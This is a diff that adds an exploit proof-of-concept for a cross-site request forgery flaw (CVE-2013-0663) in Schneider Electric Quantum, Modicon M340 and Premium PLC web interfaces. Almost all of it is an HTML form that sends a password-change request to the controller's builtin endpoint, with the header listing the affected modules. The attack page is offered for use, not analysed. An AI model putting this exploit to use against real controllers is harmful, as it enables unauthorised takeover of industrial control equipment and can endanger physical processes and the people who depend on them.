@@ -1,0 +1,103 @@
+# Exploit Title: Schneider Electric PLCs - Cross-Site Request Forgery
+# Date: 2018-05-12
+# Exploit Author: t4rkd3vilz
+# Vendor Homepage: http://www.schneider-electric.com/
+# Tested on: Windows
+# CVE: CVE-2013-0663
+# Version: Schneider Electric Quantum PLC: 140NOE77111, 140NOE77101, 140NWM10000
+# Modicon M340 PLC: BMXNOC0401, BMXNOE0100x, BMXNOE011xx
+# Premium PLC: TSXETY4103, TSXETY5103, and TSXWMY100
+# Category: webapps
+
+<html>
+<head>
+    <title>CSRF POC</title>
+</head>
+<body>
+    <form method="get" action="http://TargetIP/secure/embedded/builtin" name="sample" onSubmit="return validateForm()">
+<table border="0" cellspacing="0" cellpadding="0" width="300" style="height: 100" bgcolor="#C0C0C0">
+<tr>
+<td class="inputCell" width="200">
+<div align="left">
+<h5>Name:</h5>
+<script language="javascript" type="text/javascript">
+<!--//
+paramLang();
+switch(getLanguage())
+{
+
+default:
+document.write("Username :"); break;
+}
+//-->
+</script>
+</div>
+</td>
+<td class="inputCell" width="190">
+<input type="text" name="user" size="20">
+</td>
+</tr>
+<tr>
+<td class="inputCell" width="200">
+<div align="left">&
+<h5>Pass:</h5>
+<script language="javascript" type="text/javascript">
+<!--//
+switch(getLanguage())
+{
+default:
+document.write("New password :"); break;
+}
+//-->
+</script>
+</div>
+</td>
+<td class="inputCell" width="190">
+<input type="password" name="passwd" size="20">
+</td>
+</tr>
+<tr>
+<td class="inputCell" width="200">
+<div align="left">
+<h5>Verify Pass:</h5>
+<script language="javascript" type="text/javascript">
+<!--//
+switch(getLanguage())
+{
+
+default:
+document.write("Confirm password :"); break;
+}
+//-->
+</script>
+</div>
+</td>
+<td class="inputCell" width="190">
+<input type="password" name="cnfpasswd" size="20">
+</td>
+</tr>
+</table>
+<br>
+<div align="center">
+<script language="javascript" type="text/javascript">
+<!--//
+switch(getLanguage())
+{
+
+default:
+document.write('<input type="submit" name="subhttppwd" value="Change Password">'); break;
+}
+//-->
+</script>
+<input type="submit" name="subhttppwd" value="Change Password">
+</div>
+</form>
+<br>
+</td>
+</tr>
+<tr>
+<td align="center">
+<br>
+
+</body>
+</html>
